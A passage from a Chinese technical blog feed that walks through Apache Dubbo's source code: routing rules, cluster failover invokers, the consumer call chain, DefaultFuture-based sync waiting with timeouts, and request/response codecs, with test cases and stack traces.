class="hljs-number">38</span>FailoverClusterInvoker&lt;T&gt;(AbstractClusterInvoker&lt;T&gt;).doselect(LoadBalance, Invocation, List&lt;Invoker&lt;T&gt;&gt;, List&lt;Invoker&lt;T&gt;&gt;) line: <span class="hljs-number">132</span>FailoverClusterInvoker&lt;T&gt;(AbstractClusterInvoker&lt;T&gt;).select(LoadBalance, Invocation, List&lt;Invoker&lt;T&gt;&gt;, List&lt;Invoker&lt;T&gt;&gt;) line: <span class="hljs-number">115</span>FailoverClusterInvoker&lt;T&gt;.doInvoke(Invocation, List&lt;Invoker&lt;T&gt;&gt;, LoadBalance) line: <span class="hljs-number">73</span>FailoverClusterInvoker&lt;T&gt;(AbstractClusterInvoker&lt;T&gt;).invoke(Invocation) line: <span class="hljs-number">227</span>MockClusterInvoker&lt;T&gt;.invoke(Invocation) line: <span class="hljs-number">72</span>InvokerInvocationHandler.invoke(Object, Method, Object[]) line: <span class="hljs-number">52</span>proxy0.sayHello(String) line: not availableHelloClientTest.testSayHello() line: <span class="hljs-number">37</span></code></pre><p>具体的负载均衡算法不分析了，看下对应代码还是比较清晰的。  </p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]16.路由如何实现</title>
    <link href="/2020/06/01/dubbo-16.how-to-implements-route-client-sdie/"/>
    <url>/2020/06/01/dubbo-16.how-to-implements-route-client-sdie/</url>
    
    <content type="html"><![CDATA[<h2 id="16-路由如何实现"><a href="#16-路由如何实现" class="headerlink" title="16.路由如何实现"></a>16.路由如何实现</h2><p>com.alibaba.dubbo.rpc.cluster.directory.AbstractDirectory.list(Invocation) 中织入了路由的逻辑；</p><h3 id="使用路由的test-case"><a href="#使用路由的test-case" class="headerlink" title="使用路由的test case"></a>使用路由的test case</h3><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.code260.ss.dubbo.demov.client.routeruler;<span class="hljs-keyword">import</span> org.junit.BeforeClass;<span class="hljs-keyword">import</span> org.junit.Test;<span class="hljs-keyword">import</span> org.junit.runner.RunWith;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> org.springframework.test.context.ContextConfiguration;<span class="hljs-keyword">import</span> org.springframework.test.context.junit4.SpringJUnit4ClassRunner;<span class="hljs-keyword">import</span> com.alibaba.dubbo.common.URL;<span class="hljs-keyword">import</span> com.alibaba.dubbo.common.extension.ExtensionLoader;<span class="hljs-keyword">import</span> com.alibaba.dubbo.registry.Registry;<span class="hljs-keyword">import</span> com.alibaba.dubbo.registry.RegistryFactory;<span class="hljs-keyword">import</span> com.code260.ss.dubbo.demov.facade.service.HelloService;<span class="hljs-comment">/**</span><span class="hljs-comment"> * &lt;一句话功能简述&gt; &lt;功能详细描述&gt;</span><span class="hljs-comment"> * </span><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Chenxiaguang</span><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> [版本号, 2015-8-12]</span><span class="hljs-comment"> * <span class="hljs-doctag">@see</span> [相关类/方法]</span><span class="hljs-comment"> * <span class="hljs-doctag">@since</span> [产品/模块版本]</span><span class="hljs-comment"> */</span><span class="hljs-meta">@RunWith</span>(SpringJUnit4ClassRunner<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>@ContextConfiguration("/com/code260/ss/dubbo/demov/client/conf/routerruler/applicationContext.xml")<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloClientTest</span></span><span class="hljs-class"></span>&#123;        <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> HelloService helloService;        <span class="hljs-meta">@BeforeClass</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setup</span><span class="hljs-params">()</span> </span>&#123;    RegistryFactory registryFactory = ExtensionLoader.getExtensionLoader(RegistryFactory<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">getAdaptiveExtension</span>()</span>;    <span class="hljs-comment">// 获取注册中心，这里使用zk</span>    Registry registry = registryFactory.getRegistry(URL.valueOf(<span class="hljs-string">"zookeeper://127.0.0.1:2182"</span>));    <span class="hljs-comment">// 注册中心上配置规则         </span>    URL condition = URL.valueOf(<span class="hljs-string">"condition://0.0.0.0/com.code260.ss.dubbo.demov.facade.service.HelloService?category=routers&amp;dynamic=false&amp;rule="</span>         + URL.encode(<span class="hljs-string">"host = 192.168.2.3 =&gt; port = 20880"</span>));    System.out.println(condition.toString());    registry.register(condition);    &#125;        <span class="hljs-meta">@Test</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">testSayHello</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;    <span class="hljs-keyword">this</span>.helloService.sayHello(<span class="hljs-string">"Simon1"</span>);    <span class="hljs-keyword">this</span>.helloService.sayHello(<span class="hljs-string">"Simon2"</span>);    <span class="hljs-keyword">this</span>.helloService.sayHello(<span class="hljs-string">"Simon3"</span>);    <span class="hljs-keyword">this</span>.helloService.sayHello(<span class="hljs-string">"Simon4"</span>);    &#125;&#125;</code></pre><p>这是client侧的case，provider继续沿用多个provider的case，此时我们配置了路由规则，让192.168.2.3这台机器发出的调用都路由到端口是20880的服务节点上。</p><h3 id="路由实现与服务发现衔接处"><a href="#路由实现与服务发现衔接处" class="headerlink" title="路由实现与服务发现衔接处"></a>路由实现与服务发现衔接处</h3><p>dubbo实现路由的地方是在com.alibaba.dubbo.rpc.cluster.directory.AbstractDirectory.list(Invocation)。  </p><p>贴下相应调用栈和关键代码，调用栈如下：</p><pre><code class="hljs java">RegistryDirectory&lt;T&gt;(AbstractDirectory&lt;T&gt;).list(Invocation) line: <span class="hljs-number">81</span>FailoverClusterInvoker&lt;T&gt;(AbstractClusterInvoker&lt;T&gt;).list(Invocation) line: <span class="hljs-number">260</span>FailoverClusterInvoker&lt;T&gt;(AbstractClusterInvoker&lt;T&gt;).invoke(Invocation) line: <span class="hljs-number">219</span>MockClusterInvoker&lt;T&gt;.invoke(Invocation) line: <span class="hljs-number">72</span>InvokerInvocationHandler.invoke(Object, Method, Object[]) line: <span class="hljs-number">52</span>proxy0.sayHello(String) line: not availableHelloClientTest.testSayHello() line: <span class="hljs-number">56</span></code></pre><p>代码如下：</p><p>com.alibaba.dubbo.rpc.cluster.directory.AbstractDirectory.list(Invocation)  </p><pre><code class="hljs java"><span class="hljs-number">69</span>    <span class="hljs-keyword">public</span> List&lt;Invoker&lt;T&gt;&gt; list(Invocation invocation) <span class="hljs-keyword">throws</span> RpcException &#123;<span class="hljs-number">70</span>        <span class="hljs-keyword">if</span> (destroyed)&#123;<span class="hljs-number">71</span>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RpcException(<span class="hljs-string">"Directory already destroyed .url: "</span>+ getUrl());        &#125;        List&lt;Invoker&lt;T&gt;&gt; invokers = doList(invocation);<span class="hljs-number">74</span>        List&lt;Router&gt; localRouters = <span class="hljs-keyword">this</span>.routers; <span class="hljs-comment">// local reference</span>        <span class="hljs-keyword">if</span> (localRouters != <span class="hljs-keyword">null</span> &amp;&amp; localRouters.size() &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-number">76</span>            <span class="hljs-keyword">for</span> (Router router: localRouters)&#123;                <span class="hljs-keyword">try</span> &#123;                    <span class="hljs-keyword">if</span> (router.getUrl() == <span class="hljs-keyword">null</span> || router.getUrl().getParameter(Constants.RUNTIME_KEY, <span class="hljs-keyword">true</span>)) &#123;<span class="hljs-number">79</span>                        invokers = router.route(invokers, getConsumerUrl(), invocation);                    &#125;                &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;                    logger.error(<span class="hljs-string">"Failed to execute router: "</span> + getUrl() + <span class="hljs-string">", cause: "</span> + t.getMessage(), t);                &#125;            &#125;        &#125;        <span class="hljs-keyword">return</span> invokers;    &#125;</code></pre><p>79行会根据我们配置的路由规则，过滤出符合路由条件的invoker列表。</p><p>此处路由我们使用的是条件路由，具体实现比较简单，阅读com.alibaba.dubbo.rpc.cluster.router.condition.ConditionRouter.route(List&lt;Invoker<T>&gt;, URL, Invocation)代码即可。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]15.多个provider如何在客户端体现，即集群如何实现</title>
    <link href="/2020/06/01/dubbo-15.how-to-implements-cluster-client-side/"/>
    <url>/2020/06/01/dubbo-15.how-to-implements-cluster-client-side/</url>
    
    <content type="html"><![CDATA[<h2 id="15-多个provider如何在客户端体现，即集群如何实现"><a href="#15-多个provider如何在客户端体现，即集群如何实现" class="headerlink" title="15.多个provider如何在客户端体现，即集群如何实现"></a>15.多个provider如何在客户端体现，即集群如何实现</h2><h3 id="多provider的test-case"><a href="#多provider的test-case" class="headerlink" title="多provider的test case"></a>多provider的test case</h3><p>为了分析多个provider，我们在demo中再加一个node，代码如下：</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.code260.ss.dubbo.demov.server.registercenter.zookeeper;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> org.junit.Test;<span class="hljs-keyword">import</span> org.junit.runner.RunWith;<span class="hljs-keyword">import</span> org.springframework.test.context.ContextConfiguration;<span class="hljs-keyword">import</span> org.springframework.test.context.junit4.SpringJUnit4ClassRunner;<span class="hljs-meta">@RunWith</span>(SpringJUnit4ClassRunner<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>@ContextConfiguration("/com/code260/ss/dubbo/demov/server/conf/registercenter/zookeeper/applicationContextNode2.xml")<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloServiceTestNode2</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-meta">@Test</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">testSayHello</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">try</span>        &#123;            System.out.println(<span class="hljs-string">"zookeeper注册中心demo：I am node2:-)"</span>);            System.in.read();        &#125;        <span class="hljs-keyword">catch</span> (IOException e)        &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>applicationContextNode2.xml中关键配置如下：  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">import</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">"classpath:com/code260/ss/dubbo/demov/server/conf/registercenter/zookeeper/applicationContext.xml"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:registry</span> <span class="hljs-attr">protocol</span>=<span class="hljs-string">"zookeeper"</span> <span class="hljs-attr">address</span>=<span class="hljs-string">"$&#123;zookeeper_rigister_center&#125;"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:monitor</span> <span class="hljs-attr">protocol</span>=<span class="hljs-string">"registry"</span> /&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:protocol</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"dubbo"</span> <span class="hljs-attr">port</span>=<span class="hljs-string">"20890"</span>/&gt;</span></code></pre><p>监听在20890端口</p><p>我们跑一下client demo侧的HelloClientTest。  </p><h3 id="消费端发现多个provider"><a href="#消费端发现多个provider" class="headerlink" title="消费端发现多个provider"></a>消费端发现多个provider</h3><p>回顾消费者如何发现服务一文中</p><p>注册协议到Invoker创建的堆栈：</p><pre><code class="hljs java">DubboInvoker&lt;T&gt;.&lt;init&gt;(Class&lt;T&gt;, URL, ExchangeClient[], Set&lt;Invoker&lt;?&gt;&gt;) line: <span class="hljs-number">62</span>DubboProtocol.refer(Class&lt;T&gt;, URL) line: <span class="hljs-number">303</span>ProtocolFilterWrapper.refer(Class&lt;T&gt;, URL) line: <span class="hljs-number">62</span>ProtocolListenerWrapper.refer(Class&lt;T&gt;, URL) line: <span class="hljs-number">65</span>Protocol$Adpative.refer(Class, URL) line: not availableRegistryDirectory&lt;T&gt;.toInvokers(List&lt;URL&gt;) line: <span class="hljs-number">395</span>RegistryDirectory&lt;T&gt;.refreshInvoker(List&lt;URL&gt;) line: <span class="hljs-number">224</span>RegistryDirectory&lt;T&gt;.notify(List&lt;URL&gt;) line: <span class="hljs-number">195</span>ZookeeperRegistry(AbstractRegistry).notify(URL, NotifyListener, List&lt;URL&gt;) line: <span class="hljs-number">449</span>ZookeeperRegistry(FailbackRegistry).doNotify(URL, NotifyListener, List&lt;URL&gt;) line: <span class="hljs-number">273</span>ZookeeperRegistry(FailbackRegistry).notify(URL, NotifyListener, List&lt;URL&gt;) line: <span class="hljs-number">259</span>ZookeeperRegistry.doSubscribe(URL, NotifyListener) line: <span class="hljs-number">170</span></code></pre><p>ZookeeperRegistry.doSubscribe的部分代码：</p><pre><code class="hljs java"><span class="hljs-number">164</span>                    zkClient.create(path, <span class="hljs-keyword">false</span>);<span class="hljs-number">165</span>                    List&lt;String&gt; children = zkClient.addChildListener(path, zkListener);<span class="hljs-number">166</span>                    <span class="hljs-keyword">if</span> (children != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-number">167</span>                    urls.addAll(toUrlsWithEmpty(url, path, children));<span class="hljs-number">168</span>                    &#125;<span class="hljs-number">169</span>                &#125;<span class="hljs-number">170</span>               notify(url, listener, urls);</code></pre><p>当有多个provider时，165行能查到多个children，表示获取到了多个provider，然后在RegistryDirectory<T>.toInvokers(List<URL>) line: 395 会转换成多个invoker。当然，这种描述的是先启动了多个provider，再启动消费者的case。对于那种后启动加进来的provider，消费者也是能感知到的。</p><h3 id="选择一个Invoker进行调用并封装了集群语义"><a href="#选择一个Invoker进行调用并封装了集群语义" class="headerlink" title="选择一个Invoker进行调用并封装了集群语义"></a>选择一个Invoker进行调用并封装了集群语义</h3><p>既然能在消费端发现了多个Invoker，那么在调用时就要选择一个。在哪里选择的呢？代码如下：</p><p>FailoverClusterInvoker<T>.doInvoke(Invocation, List&lt;Invoker<T>&gt;, LoadBalance) line: 78    </p><pre><code class="hljs java"><span class="hljs-number">53</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result <span class="hljs-title">doInvoke</span><span class="hljs-params">(Invocation invocation, <span class="hljs-keyword">final</span> List&lt;Invoker&lt;T&gt;&gt; invokers, LoadBalance loadbalance)</span> <span class="hljs-keyword">throws</span> RpcException </span>&#123;    <span class="hljs-comment">// ......</span><span class="hljs-number">73</span>           Invoker&lt;T&gt; invoker = select(loadbalance, invocation, copyinvokers, invoked);<span class="hljs-number">74</span>            invoked.add(invoker);<span class="hljs-number">75</span>            RpcContext.getContext().setInvokers((List)invoked);<span class="hljs-number">76</span>            <span class="hljs-keyword">try</span> &#123;<span class="hljs-number">77</span>                Result result = invoker.invoke(invocation);</code></pre><p>此时的入参invokers示例值是：[com.alibaba.dubbo.registry.integration.RegistryDirectory$InvokerDelegete@c65a5ef, com.alibaba.dubbo.registry.integration.RegistryDirectory$InvokerDelegete@6b5176f2]  </p><p>也就是会将发现的invoker列表传进来，然后选一个Invoker(73行)进行调用(77行)。  </p><p>从<strong>FailoverClusterInvoker</strong>这个类名已经发现，此处封装了<strong>集群</strong>语义，也实现了容错。容错具体细节在后面文章阐述。此处先描述一路到底的调用过程。当然FailoverClusterInvoker是默认的实现选择，还有其他策略，诸如：FailfastClusterInvoker，FailbackClusterInvoker等实现。  </p><p>相关调用堆栈如下：  </p><pre><code class="hljs java">FailoverClusterInvoker&lt;T&gt;.doInvoke(Invocation, List&lt;Invoker&lt;T&gt;&gt;, LoadBalance) line: <span class="hljs-number">78</span>FailoverClusterInvoker&lt;T&gt;(AbstractClusterInvoker&lt;T&gt;).invoke(Invocation) line: <span class="hljs-number">227</span>MockClusterInvoker&lt;T&gt;.invoke(Invocation) line: <span class="hljs-number">72</span>InvokerInvocationHandler.invoke(Object, Method, Object[]) line: <span class="hljs-number">52</span>proxy0.sayHello(String) line: not availableHelloClientTest.testSayHello() line: <span class="hljs-number">37</span></code></pre><p>proxy0就是前面 消费者consumer侧 reference bean生成逻辑 文章中讲到的生成的代理。  </p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]14.consumer端调用链</title>
    <link href="/2020/05/30/dubbo-14.consumer-invoke-chain/"/>
    <url>/2020/05/30/dubbo-14.consumer-invoke-chain/</url>
    
    <content type="html"><![CDATA[<h2 id="14-consumer端调用链"><a href="#14-consumer端调用链" class="headerlink" title="14.consumer端调用链"></a>14.consumer端调用链</h2><h3 id="示意图"><a href="#示意图" class="headerlink" title="示意图"></a>示意图</h3><pre><code class="hljs plain"> +----------------------+     +----------------+      +---------------------------+ | helloService         |     |      proxy     |      |  InvokerInvocationHandler | | sayHello             +---&gt; |      sayHello  +------&gt;  invoke                   | |                      |     |                |      |  proxy method args        | +----------------------+     +----------------+      +-------------+-------------+                                                                    |                                                                    |                                                     +------------------------------+                                                     |              |               |                                                     | +------------v---------------+                                                     | |  MockClusterInvoker       ||                                                     | |  invoke                   ||                                                     | |                           ||                                                     | +------------+---------------+                                                     |              |               |                                                     |              |               |                                                     |              |               |  +---------------------+     +-------------------+  | +------------v---------------+  | Router              |     | RegistryDirectory |  | |  FailoverClusterInvoker   ||  | route               &lt;-----+ list              &lt;--+    invoke                   ||  | MockInVokersSelector|     | INVOCATION+-      |  | |                           ||  +------+--------------+     | ^List INVOKER     |  | +----------------------------+         |                    +-------------------+  |                              |         |                                           +------------------------------+         |                                        cluster invoke，分布式调用容错机制也是在这做         |         |         |         |         |+--------v-------------+      +----------------+       +---------------------------+|RandomLoadBalance     |      |InvokerDelegate |       | ListenerInvokerWrap       ||select                +----&gt; |invoke          +-------&gt; invoke                    ||List INVOKER+-^INVOKER|      |                |       |                           |+----------------------+      +----------------+       +---------------------------+</code></pre><p>RegistryProtocol 注册中心协议 对接口协议接口约束，不论何种注册中心都走这个实现。<br>RegistryDirectory 提供由服务目录查找出真正能提供服务的所有提供方<br>Registry 各个注册中心的实现的接口约束，具体实现有 RedisRegistry ZookeeperRegistry MulticastRegistry DubboRegistry。 主要完成注册这个逻辑。 就是把自己的信息写入注册中心。<br>Cluster 多服务提供方的一个封装 。他们负责创建多服务调用者实例。 比如FailoverCluster负责创建FailoverClusterInvoker实例。Cluster的实现是以分布式容错机制Failover,Failfast,Failback等这些维度进行。 对应invoker也是按照这个维度划分，比如FailbackClusterInvoker，FailfastClusterInvoker，BroadcastClusterInvoker等等。<br>Router 路由机制<br>LoadBalance 负载均衡机制<br>Invoker 调用者。 按分布式容错机制的维度进行划分了多个实现，与 Cluster实现一一对应。<br>基本上描述了 由consumer的ref类–&gt;proxy–&gt;InvokerInvocationHandler–&gt;clusterinvoker–&gt;服务目录查找–&gt;路由机制–&gt;负载均衡机制–&gt;调用委托–&gt;调用监听器。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]13.调用端如何同步等待网络返回结果以及如何实现调用端超时</title>
    <link href="/2020/05/30/dubbo-13.how-to-implements-sync-and-timeout/"/>
    <url>/2020/05/30/dubbo-13.how-to-implements-sync-and-timeout/</url>
    
    <content type="html"><![CDATA[<h2 id="13-调用端如何同步等待网络返回结果以及如何实现调用端超时"><a href="#13-调用端如何同步等待网络返回结果以及如何实现调用端超时" class="headerlink" title="13.调用端如何同步等待网络返回结果以及如何实现调用端超时"></a>13.调用端如何同步等待网络返回结果以及如何实现调用端超时</h2><p>rpc的调用不同于我们那种简单的在本地的同步调用，当一个调用发出去之后，要经过编解码，发送到provider端，等provider端处理完回来再接收到响应结果。这个过程是”异步的“，那么我们再调用时如何让异步转同步，能等到结果的？  </p><p>在前面讲 发现到服务之后如何玩转调用的最简过程 部分时，当consumer端发送调用请求时要过HeaderExchangeChannel.request(Object, int) line: 112    。我们来看下这部分的代码：  </p><pre><code class="hljs java">    <span class="hljs-function"><span class="hljs-keyword">public</span> ResponseFuture <span class="hljs-title">request</span><span class="hljs-params">(Object request, <span class="hljs-keyword">int</span> timeout)</span> <span class="hljs-keyword">throws</span> RemotingException </span>&#123;        <span class="hljs-keyword">if</span> (closed) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RemotingException(<span class="hljs-keyword">this</span>.getLocalAddress(), <span class="hljs-keyword">null</span>, <span class="hljs-string">"Failed to send request "</span> + request + <span class="hljs-string">", cause: The channel "</span> + <span class="hljs-keyword">this</span> + <span class="hljs-string">" is closed!"</span>);        &#125;        <span class="hljs-comment">// create request.</span>        Request req = <span class="hljs-keyword">new</span> Request();        req.setVersion(<span class="hljs-string">"2.0.0"</span>);        req.setTwoWay(<span class="hljs-keyword">true</span>);        req.setData(request);<span class="hljs-number">109</span>        DefaultFuture future = <span class="hljs-keyword">new</span> DefaultFuture(channel, req, timeout);<span class="hljs-number">110</span>        <span class="hljs-keyword">try</span>&#123;<span class="hljs-number">112</span>            channel.send(req);        &#125;<span class="hljs-keyword">catch</span> (RemotingException e) &#123;            future.cancel();            <span class="hljs-keyword">throw</span> e;        &#125;        <span class="hljs-keyword">return</span> future;    &#125;</code></pre><p>我们看到109行构建了DefaultFuture对象，并将其作为返回值返回，DefaultFuture是ResponseFuture子类。  </p><p>那么，我们就发现了，同步等待结果是靠dubbo自己又做DefaultFuture的包装完成的，背后是靠ReentrantLock的Condition对象的await完成等待，并实现客户端调用超时机制。   </p><p>get的时候用上面的condition进行等待。  </p><p>接收到结果的时候，对上面的condition进行signal完成等待。至于 Condition对象为什么能完成异步转同步的等待，已经不在本系列文章的讲解范围了。在JDK并发库源码阅读中讲。  </p><p>附上部分代码：  </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doReceived</span><span class="hljs-params">(Response res)</span> </span>&#123;    lock.lock();    <span class="hljs-keyword">try</span> &#123;        response = res;        <span class="hljs-keyword">if</span> (done != <span class="hljs-keyword">null</span>) &#123;            done.signal();        &#125;    &#125; <span class="hljs-keyword">finally</span> &#123;        lock.unlock();    &#125;    <span class="hljs-keyword">if</span> (callback != <span class="hljs-keyword">null</span>) &#123;        invokeCallback(callback);    &#125;&#125;</code></pre><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span> timeout)</span> <span class="hljs-keyword">throws</span> RemotingException </span>&#123;     <span class="hljs-keyword">if</span> (timeout &lt;= <span class="hljs-number">0</span>) &#123;         timeout = Constants.DEFAULT_TIMEOUT;     &#125;     <span class="hljs-keyword">if</span> (! isDone()) &#123;         <span class="hljs-keyword">long</span> start = System.currentTimeMillis();         lock.lock();         <span class="hljs-keyword">try</span> &#123;             <span class="hljs-keyword">while</span> (! isDone()) &#123;                 done.await(timeout, TimeUnit.MILLISECONDS);                 <span class="hljs-keyword">if</span> (isDone() || System.currentTimeMillis() - start &gt; timeout) &#123;                     <span class="hljs-keyword">break</span>;                 &#125;             &#125;         &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;             <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);         &#125; <span class="hljs-keyword">finally</span> &#123;             lock.unlock();         &#125;         <span class="hljs-keyword">if</span> (! isDone()) &#123;             <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TimeoutException(sent &gt; <span class="hljs-number">0</span>, channel, getTimeoutMessage(<span class="hljs-keyword">false</span>));         &#125;     &#125;     <span class="hljs-keyword">return</span> returnFromResponse(); &#125;</code></pre><p>这个方式是基于有前面的代码阅读基础的方式发现对应的代码逻辑在这里。如果没有前面的代码阅读基础，还有个办法就是，在跑case的时候把provider端用debug的方式挂起。 然后用jstack看consumer的堆栈也能发现，等待的代码逻辑在这里。  </p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]12.如何解码响应结果</title>
    <link href="/2020/05/30/dubbo-12.how-to-decode-response/"/>
    <url>/2020/05/30/dubbo-12.how-to-decode-response/</url>
    
    <content type="html"><![CDATA[<h2 id="12-如何解码响应结果"><a href="#12-如何解码响应结果" class="headerlink" title="12.如何解码响应结果"></a>12.如何解码响应结果</h2><p>与编码请求类似，其实上篇文章中我们已经发现了对接DubboCodec。  </p><p>不细细分析了，列出主要代码，直接看代码就可以了。  </p><pre><code class="hljs java">com.alibaba.dubbo.remoting.exchange.codec.ExchangeCodec.decode(Channel, ChannelBuffer)<span class="hljs-comment">// 读取定长heder</span>com.alibaba.dubbo.rpc.protocol.dubbo.DubboCodec.decodeBody(Channel, InputStream, <span class="hljs-keyword">byte</span>[])<span class="hljs-comment">// 读取响应体转成DecodeableRpcResult，并将其做作为com.alibaba.dubbo.remoting.exchange.Response的result即data部分</span>com.alibaba.dubbo.rpc.protocol.dubbo.DecodeableRpcResult.decode(Channel, InputStream)<span class="hljs-comment">// 解析方法调用返回值</span></code></pre><p>调用栈如下:  </p><pre><code class="hljs java">DubboCodec.decodeBody(Channel, InputStream, <span class="hljs-keyword">byte</span>[]) line: <span class="hljs-number">105</span>DubboCodec(ExchangeCodec).decode(Channel, ChannelBuffer, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">byte</span>[]) line: <span class="hljs-number">126</span>DubboCodec(ExchangeCodec).decode(Channel, ChannelBuffer) line: <span class="hljs-number">87</span>DubboCountCodec.decode(Channel, ChannelBuffer) line: <span class="hljs-number">46</span>NettyCodecAdapter$InternalDecoder.messageReceived(ChannelHandlerContext, MessageEvent) line: <span class="hljs-number">134</span>NettyCodecAdapter$InternalDecoder(SimpleChannelUpstreamHandler).handleUpstream(ChannelHandlerContext, ChannelEvent) line: <span class="hljs-number">80</span>DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline$DefaultChannelHandlerContext, ChannelEvent) line: <span class="hljs-number">564</span>DefaultChannelPipeline.sendUpstream(ChannelEvent) line: <span class="hljs-number">559</span>Channels.fireMessageReceived(Channel, Object, SocketAddress) line: <span class="hljs-number">274</span>Channels.fireMessageReceived(Channel, Object) line: <span class="hljs-number">261</span>NioWorker.read(SelectionKey) line: <span class="hljs-number">349</span>NioWorker.processSelectedKeys(Set&lt;SelectionKey&gt;) line: <span class="hljs-number">280</span>NioWorker.run() line: <span class="hljs-number">200</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]11.如何编码请求</title>
    <link href="/2020/05/30/dubbo-11.how-to-enode-request/"/>
    <url>/2020/05/30/dubbo-11.how-to-enode-request/</url>
    
    <content type="html"><![CDATA[<h2 id="11-如何编码请求"><a href="#11-如何编码请求" class="headerlink" title="11.如何编码请求"></a>11.如何编码请求</h2><p>关于请求的编码，如果你熟悉过dubbo代码，直接看其DubboCodec类即可。  </p><p>如果不熟悉，属于刚开始看那种，也没关系。我们用下面的办法探索一下就能发现。</p><h3 id="探索出编码器在哪里是什么"><a href="#探索出编码器在哪里是什么" class="headerlink" title="探索出编码器在哪里是什么"></a>探索出编码器在哪里是什么</h3><p>我们先从上篇文章的服务调用继续往下跟，可以发现请求要通过过Channel发送出去。调用栈如下：  </p><pre><code class="hljs java">NettyChannel.send(Object, <span class="hljs-keyword">boolean</span>) line: <span class="hljs-number">95</span>NettyClient(AbstractClient).send(Object, <span class="hljs-keyword">boolean</span>) line: <span class="hljs-number">270</span>NettyClient(AbstractPeer).send(Object) line: <span class="hljs-number">51</span>HeaderExchangeChannel.request(Object, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">112</span></code></pre><p>既然是netty的channel，我们尝试看下其pipeline，应该能发现编解码器。  </p><p>channel的ChannelPipeline pipeline字段：  </p><pre><code class="hljs java">DefaultChannelPipeline&#123;(decoder = com.alibaba.dubbo.remoting.transport.netty.NettyCodecAdapter$InternalDecoder), (encoder = com.alibaba.dubbo.remoting.transport.netty.NettyCodecAdapter$InternalEncoder), (handler = com.alibaba.dubbo.remoting.transport.netty.NettyHandler)&#125;</code></pre><p>到InternalEncoder里跟一下不难发现对接了DubboCodec。  </p><h3 id="DubboCodec分析"><a href="#DubboCodec分析" class="headerlink" title="DubboCodec分析"></a>DubboCodec分析</h3><h4 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h4><p>encode部分传进来的msg的Object的class是class com.alibaba.dubbo.remoting.exchange.Request。  </p><p>这个过程主要完成的是： </p><ol><li>编码头部</li><li>选出序列化器，用于后续编码</li></ol><h4 id="encodeRequestData"><a href="#encodeRequestData" class="headerlink" title="encodeRequestData"></a>encodeRequestData</h4><p>encodeRequestData这个部分用来编码Request对象中data部分，data是class com.alibaba.dubbo.rpc.RpcInvocation。看下其toString如下：  </p><blockquote><p>RpcInvocation [methodName=queryUser, parameterTypes=[class java.lang.Integer], arguments=[100], 